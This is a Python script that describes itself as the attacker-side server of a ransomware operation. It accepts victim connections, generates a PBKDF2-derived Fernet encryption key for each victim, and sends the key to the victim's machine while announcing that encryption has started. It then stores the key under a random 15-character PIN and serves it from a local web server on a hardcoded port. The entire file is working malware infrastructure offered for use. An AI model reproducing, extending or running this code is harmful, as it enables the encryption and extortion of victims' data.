#!/usr/bin/python
# This is a key generating and victim's connection hacndling sercver ...to be run on attacker machine

import time 
import sys 
import base64 
import os 
import socket

import thread  # it is a multithreaded server able to handle client connections hardcoded in the program without shutting down..

# importing all required cryptography mopdules of python ...private key cryptography\

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

def generate_key(passwd, name):
    
    password = passwd.encode()
    salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c' 
    kdf = PBKDF2HMAC(
	    algorithm=hashes.SHA256(),
	    length=32,
	    salt=salt,
	    iterations = 1000000,
	    backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))

    global auth_pin # GLOBAL variable , can be access outside the function block ;../
	
    auth_pin = key_authpass()
    file = open(auth_pin+".key" , "wb")
    file.write(key)
    file.close()

    return key

def key_authpass():

	import random 
	import string 
	
	passcombo = string.ascii_uppercase+string.digits+string.ascii_lowercase
	otp = ''.join(random.choice(passcombo) for _ in range(15)) 
	return otp 

def key_transfer():
	
  	# transferring to inbuilt apache2 server directory...in keys folder ../
	os.chdir("/root/malware")
	os.system("mv ???????????????.key /root/malware/keys")

def python_webserver():
	
	print("Starting the key handling Web Server....")
	os.chdir("/root/malware")
	os.system("python -m SimpleHTTPServer 999") # hardcoded port --->>> 999 for now../

def ClientHandler_server(clientSocket, addr) :
	while 1:
		client_data  = clientSocket.recv(2048)
		
		if client_data :
			
			print client_data			
			clientSocket.send(client_data)
			password = Fernet.generate_key()
			print "Victim's PBKDF password is: " + password
			secret = generate_key(password, addr[0])
			print "Secret AES encryption key is: " + secret
			print "Victim's 15 digit pin is : " + auth_pin 

			clientSocket.send(secret)
			
			print clientSocket.recv(2048)
			
			print "Data encryption started on Victim's computer..."
			print "Transffering the private key containing file of the Current victim to the local server directory ..."

			key_transfer()
			print "Transffered the key file to the distribution server"
			python_webserver() # server started.../
			
			clientSocket.close()
			break
			
		else :
			
			clientSocket.close()
			return

	

hacker_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

hacker_server.bind((sys.argv[1], int(sys.argv[2])))
hacker_server.listen(10)

while 1:
	# while loop till condition true or for handling the multiple client connections . 
	cSock, addr = hacker_server.accept()
	
	print "Establishing the new remote connection ... \n"
	print "receving from %s: %s "%(addr)
	# new active thread...
	thread.start_new_thread(ClientHandler_server, (cSock, addr))
	
# code end for now..
# ;;;';';))-----::??>>


